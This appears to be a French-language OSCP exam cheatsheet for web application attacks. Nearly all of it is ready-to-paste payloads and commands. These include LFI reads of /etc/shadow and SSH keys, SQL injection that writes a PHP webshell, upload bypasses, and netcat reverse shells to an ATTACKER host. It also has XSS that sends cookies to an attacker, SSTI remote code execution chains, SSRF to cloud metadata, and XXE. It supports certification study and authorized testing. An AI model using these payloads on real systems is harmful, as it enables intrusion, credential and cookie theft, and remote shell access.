# 🌐 Web — Cheatsheet OSCP

## Reconnaissance HTTP

```bash
# Headers + technologies
curl -I -s http://TARGET
whatweb http://TARGET
wappalyzer  # extension navigateur

# Nmap HTTP scripts
nmap -p80,443 --script=http-enum,http-headers,http-methods,http-title,http-robots.txt TARGET

# Vérifier robots.txt, sitemap.xml
curl -s http://TARGET/robots.txt
curl -s http://TARGET/sitemap.xml

# Par défaut : checker ces chemins
/admin /login /test /dev /.git /.env /backup
/phpinfo.php /info.php /server-status /server-info
```

## Directory brute-force

```bash
# ffuf (le plus rapide)
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,307,401,403
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt,.bak -fc 404

# gobuster
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50

# Virtual hosts (subdomain fuzzing)
ffuf -u http://TARGET -H "Host: FUZZ.example.com" -w subdomains.txt -fs 12345  # fs = filter taille
gobuster vhost -u http://TARGET -w subdomains.txt

# Sous-dossiers récursifs
feroxbuster -u http://TARGET -w wordlist.txt -d 3
```

## LFI / RFI

```
# Detection
?file=/etc/passwd
?file=../../../etc/passwd
?file=....//....//....//etc/passwd       # double encoding
?file=%2e%2e/%2e%2e/etc/passwd
?file=/etc/passwd%00                      # null byte (PHP < 5.3.4)
?page=php://filter/convert.base64-encode/resource=index.php

# Fichiers à lire
/etc/passwd
/etc/shadow                       # rare
/etc/hosts
/etc/hostname
/proc/self/environ                # variables d'env (HTTP_USER_AGENT injectable)
/proc/self/cmdline
/var/log/apache2/access.log       # log poisoning
/var/log/auth.log
~/.ssh/id_rsa
/home/USER/.bash_history
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\repair\sam

# LFI → RCE
# 1. Log poisoning : injecter <?php system($_GET['c']); ?> dans User-Agent, puis LFI sur le log
# 2. php://filter + php://input
curl "http://TARGET/?file=php://input" -d "<?php system('id'); ?>"
# 3. expect:// (rare)
# 4. PHP session file : /var/lib/php/sessions/sess_XXX
# 5. data://text/plain,<?php system('id'); ?>
```

## SQL injection

```sql
-- Détection
' OR 1=1 --
admin' --
' UNION SELECT NULL,NULL--
' AND SLEEP(5)--        -- blind time-based
' AND (SELECT LENGTH(username) FROM users WHERE id=1)>5--

-- sqlmap (le réflexe OSCP)
sqlmap -u "http://TARGET/page.php?id=1" --batch --dbs
sqlmap -u "http://TARGET/page.php?id=1" --batch -D dbname --tables
sqlmap -u "http://TARGET/page.php?id=1" --batch -D dbname -T users --dump
sqlmap -u "http://TARGET/page.php?id=1" --batch --os-shell
sqlmap -r request.txt --batch --dbs     -- depuis un fichier burp

-- En POST / cookie / header
sqlmap -u "http://TARGET/login" --data "user=a&pass=b" -p user
sqlmap -u "http://TARGET/" --cookie "id=1*"
sqlmap -u "http://TARGET/" --headers "X-Forwarded-For: 1*"

-- Manuel UNION-based
' UNION SELECT 1,2,3--                  -- trouver le nombre de colonnes
' UNION SELECT 1,@@version,3--           -- exfiltrate
' UNION SELECT table_schema,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

## Upload / RCE

```bash
# Shell PHP minimal
echo '<?php system($_GET["c"]); ?>' > shell.php
# Extensions à tester si .php bloqué : .php3 .php4 .php5 .phtml .phar .pht .inc
# Double extension : shell.php.jpg
# Magic bytes JPEG :
printf '\xff\xd8\xff\xe0' > shell.php.jpg
echo '<?php system($_GET["c"]); ?>' >> shell.php.jpg

# Upload + renommer via .htaccess
# .htaccess :
AddType application/x-httpd-php .jpg

# Reverse shell PHP complet
# Dispo sur revshells.com ou dans /usr/share/webshells/php/
php-reverse-shell.php        # pentestmonkey

# Déclencher
curl "http://TARGET/uploads/shell.php?c=id"
curl "http://TARGET/uploads/shell.php?c=nc+ATTACKER+4444+-e+/bin/bash"
```

## XSS

```javascript
// Payloads de test
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

// Steal cookies
<script>document.location='http://ATTACKER/?c='+document.cookie</script>
<img src=x onerror="fetch('http://ATTACKER/?c='+document.cookie)">

// Blind XSS (recevoir le payload sur un listener)
<script src="http://ATTACKER/x.js"></script>

// Bypass filters basiques
<scr<script>ipt>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<script>/*</script>*/alert(1)</script>
<iframe src=javascript:alert(1)>
```

## Command injection

```bash
# Séparateurs
cmd1 ; cmd2
cmd1 && cmd2
cmd1 || cmd2
cmd1 | cmd2
cmd1 `cmd2`
cmd1 $(cmd2)
cmd1 %0a cmd2       # URL-encoded newline

# Payloads courants
; id
| id
`id`
$(id)
127.0.0.1; nc ATTACKER 4444 -e /bin/bash

# Blind : oob DNS
127.0.0.1; curl http://ATTACKER.dnslog.cn/
127.0.0.1; nslookup `whoami`.ATTACKER.dnslog.cn
```

## SSRF

```
# Ports internes
http://127.0.0.1:8080
http://localhost/admin
http://169.254.169.254/latest/meta-data/        # AWS metadata
http://metadata.google.internal/computeMetadata/v1/   # GCP
http://[::1]/admin                                # IPv6

# Bypass filters
http://2130706433/        # decimal
http://0x7f000001/        # hex
http://0177.0.0.1/        # octal
http://127.1/
http://localhost.evil.com  # DNS rebinding (contrôler DNS)

# Schemes intéressants
file:///etc/passwd
gopher://localhost:6379/_FLUSHDB      # Redis
dict://localhost:11211/stats          # Memcached
```

## SSTI (Server-Side Template Injection)

```jinja
# Detection (envoyer puis vérifier le rendu)
{{7*7}}     # Jinja2/Twig → 49
${7*7}      # Freemarker/Velocity → 49
<%= 7*7 %>  # ERB (Ruby) → 49
#{7*7}      # Ruby / Slim → 49

# Jinja2 RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## XML / XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- Blind XXE avec DTD externe -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd">%xxe;]>
<data>test</data>
```

## JWT

```bash
# Décoder
echo "eyJhbGc..." | jwt-cli decode
# Ou Python
python3 -c "import base64,json; p=input().split('.')[1]; print(json.dumps(json.loads(base64.b64decode(p+'==')),indent=2))"

# Attaques classiques
# 1. None algorithm : changer alg=none, retirer la signature
# 2. Weak secret : cracker HMAC
jwt-tool JWT -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 jwt.txt rockyou.txt
# 3. Confusion RS256 → HS256 (utiliser la public key comme secret)
```

## Autres bypasses utiles

```bash
# 403 bypass
curl -H "X-Forwarded-For: 127.0.0.1" http://TARGET/admin
curl -H "X-Real-IP: 127.0.0.1" http://TARGET/admin
curl -H "X-Original-URL: /admin" http://TARGET/
curl http://TARGET/admin..;/
curl http://TARGET/%2e/admin
curl http://TARGET/admin/.
curl http://TARGET/admin?
curl -X POST http://TARGET/admin        # méthode différente
curl -X TRACE http://TARGET/admin

# bypass-403 tool :
./bypass-403.sh http://TARGET /admin
```

## Checklist OSCP-web

- [ ] nmap complet (full TCP)
- [ ] whatweb / headers / robots.txt / sitemap.xml
- [ ] dirbrute (ffuf/gobuster) avec plusieurs wordlists
- [ ] vhost discovery si la page par défaut est générique
- [ ] Tous les formulaires testés pour SQLi / command injection
- [ ] Tous les paramètres GET/POST testés pour LFI / XXE
- [ ] Les uploads testés avec extensions bypass
- [ ] Credentials par défaut sur les panels admin identifiés
- [ ] Toutes les URLs vues → passées dans Burp History pour review
- [ ] Page de login : username enumeration (réponse différente user
      valide / invalide)

## Wordlists

```
/usr/share/wordlists/dirb/common.txt             # petit et rapide, en premier
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   # plus complet
/usr/share/seclists/Discovery/Web-Content/                      # tout
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt      # creds
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

> ⚠ **OSCP** : souvent, le web est la porte d'entrée. LFI → RCE,
> SQLi → extract creds → SSH, upload → reverse shell. Le truc c'est
> d'être systématique sur l'énumération (full port scan + dir brute +
> vhost brute) avant de se jeter sur un exploit.
